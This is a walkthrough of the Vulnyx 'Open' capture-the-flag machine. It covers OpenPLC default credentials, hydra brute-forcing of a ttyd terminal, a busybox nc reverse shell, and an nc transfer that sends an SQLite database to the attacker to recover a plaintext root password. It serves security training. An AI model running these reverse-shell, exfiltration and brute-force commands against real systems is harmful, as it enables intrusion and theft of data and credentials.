# Vulnyx: Open

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `hydra` · `nc` · `sqlite3` |
| **Tags** | `#DefaultCreds` `#CredentialSpraying` `#PlaintextCreds` `#DatabaseLeak` |
| **URL** | https://vulnyx.com/machines/ |

An OpenPLC instance is found running with its default `openplc:openplc` credentials. A known public exploit for it doesn't work, but OpenPLC's own user list leaks usernames that get sprayed against a `ttyd` web terminal on another port, landing valid credentials for `tirex`. That terminal gives a shell directly. From there, OpenPLC's SQLite database, recovered from disk, turns out to store a root password in plaintext.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn open.nyx

PORT     STATE SERVICE     REASON
22/tcp   open  ssh         syn-ack ttl 64
80/tcp   open  http        syn-ack ttl 64
7681/tcp open  unknown     syn-ack ttl 64
8080/tcp open  http-proxy  syn-ack ttl 64
MAC Address: 08:00:27:1D:9B:86 (Oracle VirtualBox virtual NIC)
```

Four ports come back open: **22 (SSH)**, **80 (HTTP)**, **7681**, and **8080**. A version and script scan on all four fills in the details:

```bash
$ sudo nmap -p 22,80,7681,8080 -sCV open.nyx

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Apache2 Debian Default Page: It works
7681/tcp open  http    ttyd 1.7.7-40e79c7 (libwebsockets 4.3.3-unknown)
|_http-title: Site doesn't have a title.
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=ttyd
|_http-server-header: ttyd/1.7.7-40e79c7 (libwebsockets/4.3.3-unknown)
8080/tcp open  http    Werkzeug httpd 2.3.7 (Python 3.11.2)
|_http-server-header: Werkzeug/2.3.7 Python/3.11.2
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /login
MAC Address: 08:00:27:1D:9B:86 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

The main page:

```
http://open.nyx
```

<img src="../Images/open/Pasted image 20260720235200.png"/>

Port 7681 turns out to be `ttyd`, a tool that exposes a terminal over the browser — and it's behind HTTP Basic Auth:

```
http://open.nyx:7681
```

<img src="../Images/open/Pasted image 20260720235226.png"/>

Port 8080 is an OpenPLC instance — an open-source platform for programmable logic controllers, with its own web management interface:

```
http://open.nyx:8080
```

<img src="../Images/open/Pasted image 20260720235255.png"/>
<img src="../Images/open/Pasted image 20260720235329.png"/>

> **Default credentials:** `openplc:openplc`

OpenPLC's default credentials work, granting access to its dashboard:

```
http://open.nyx:8080/dashboard
```

<img src="../Images/open/Pasted image 20260720235425.png"/>

## Initial Access

### An Exploit That Doesn't Work

OpenPLC has a known public exploit:

> **Exploit:** `https://www.exploit-db.com/exploits/49803` — doesn't work

```bash
$ python3 49803.py -u http://open.nyx:8080 -l openplc -p openplc -i <ATTACKER_IP> -r <PORT>

[+] Remote Code Execution on OpenPLC_v3 WebServer
[+] Checking if host http://open.nyx:8080 is Up...
[+] Host Up! ...
[+] Trying to authenticate with credentials openplc:openplc
[+] Login success!
[+] PLC program uploading...
[+] Attempt to Code injection...
[+] Sarah spawning Reverse Shell...
[+] Failed to receive connection :(
```

The version running is technically vulnerable, but this particular exploit isn't the intended entry point for the box — it targets a different angle than the one this machine actually exposes, so it fails despite the version match.

With that path closed off, the interface is worth enumerating further instead. OpenPLC's own user management page leaks the full list of accounts:

```
http://open.nyx:8080/users
```

<img src="../Images/open/Pasted image 20260720235601.png"/>

> **Users:** `openplc`, `tirex`, `root`

### Credential Spraying Against ttyd

With a set of usernames in hand, `hydra` sprays them against the `ttyd` terminal's Basic Auth on port 7681:

```bash
$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt open.nyx -s 7681 http-get /

[DATA] max 16 tasks per 1 server, overall 16 tasks, 43033197 login tries (l:3/p:14344399), ~26
89575 tries per task
[DATA] attacking http-get://open.nyx:7681/
[7681][http-get] host: open.nyx   login: tirex   password: heaven
[STATUS] 14351775.00 tries/min, 14351775 tries in 00:01h, 28681422 to do in 00:02h, 00:02h, 16 active
```

> **Credentials:** `tirex:heaven`

### Shell as tirex

Logging into the terminal directly grants a shell in the browser:

```
http://open.nyx:7681/
```

<img src="../Images/open/Pasted image 20260720235712.png"/>

Spawning a reverse shell from inside it gets something more usable outside the browser:

> **Payload:** `busybox nc <ATTACKER_IP> <PORT> -e /bin/sh`

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [open.nyx] 40514
id
uid=1000(tirex) gid=1000(tirex) groups=1000(tirex)
```

A quick pty upgrade makes the shell usable:

```bash
python3 -c 'import pty; pty.spawn ("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

```bash
tirex@open:~$ id
uid=1000(tirex) gid=1000(tirex) groups=1000(tirex)
tirex@open:~$ ls -l /home
total 4
drwx------ 3 tirex tirex 4096 Aug 22  2025 tirex
tirex@open:~$ ls -l /home/tirex/
total 4
-r-------- 1 tirex tirex 33 Aug 22  2025 user.txt
tirex@open:~$ cat /home/tirex/user.txt
36537694f3321e7a7911d746f311ed1d
```

> **User flag:** `36537694f3321e7a7911d746f311ed1d`

## Privilege Escalation

### Loot: OpenPLC's Database

```bash
tirex@open:~$ find /opt -name "config" -o -name "*.db"
/opt/OpenPLC_v3/.venv/lib/python3.11/site-packages/setuptools/config
/opt/OpenPLC_v3/webserver/openplc.db
/opt/OpenPLC_v3/installed.db
/opt/OpenPLC_v3/utils/dnp3_src/config
/opt/OpenPLC_v3/utils/dnp3_src/dotnet/bindings/CLRInterface/config
/opt/OpenPLC_v3/utils/dnp3_src/dotnet/config
/opt/OpenPLC_v3/utils/matiec_src/config
/opt/OpenPLC_v3/.git/config
tirex@open:~$ file /opt/OpenPLC_v3/webserver/openplc.db
/opt/OpenPLC_v3/webserver/openplc.db: SQLite 3.x database, last written import(sic)
     using SQLite version 3040001, file counter 552, database pages 13, 1st free page 10, free pages 3, cookie 0x10, schema 4, UTF-8, version-valid-for 552
```

OpenPLC's own SQLite database comes off the box over a raw `nc` transfer — the target sends the file into a connection, the attacker listens and redirects the incoming stream to a file:

```bash
# Victim Machine
tirex@open:~$ nc <ATTACKER_IP> <PORT> < /opt/OpenPLC_v3/webserver/openplc.db

# Attacker Machine
$ nc -lvp <PORT> > openplc.db
```

Dumping the database locally shows its full contents:

```bash
$ sqlite3 openplc.db
sqlite> .dump
```

<img src="../Images/open/Pasted image 20260721000007.png"/>

A `root` password sits in the dump in plaintext:

> **Credentials:** `root:Th3_r00t_is_G0d`

### Root Access via a Leaked Database Credential

As with a couple of other boxes in this set, the final step here isn't a local exploit — it's a credential found somewhere it shouldn't have been:

```bash
tirex@open:~$ su root
Password:
root@open:/home/tirex# id
uid=0(root) gid=0(root) groups=0(root)
root@open:/home/tirex# ls -l /root
total 4
-r-------- 1 root root 33 Aug 22  2025 root.txt
root@open:/home/tirex# cat /root/root.txt
bba5053c73653e33a5eefaefb4ad8e47
```

> **Root flag:** `bba5053c73653e33a5eefaefb4ad8e47`

## Takeaways

- Default credentials on niche or industrial-facing software (OpenPLC included) are worth trying before anything more elaborate — they're often still the fastest way in.
- A public exploit not working isn't the end of the road; the target application itself often leaks the next piece needed, in this case a full username list from its own admin panel.
- An application's local database is a common place for credentials to leak, especially when it's storing more than just its own data — a plaintext password for a system account has no business sitting in an app-level SQLite file.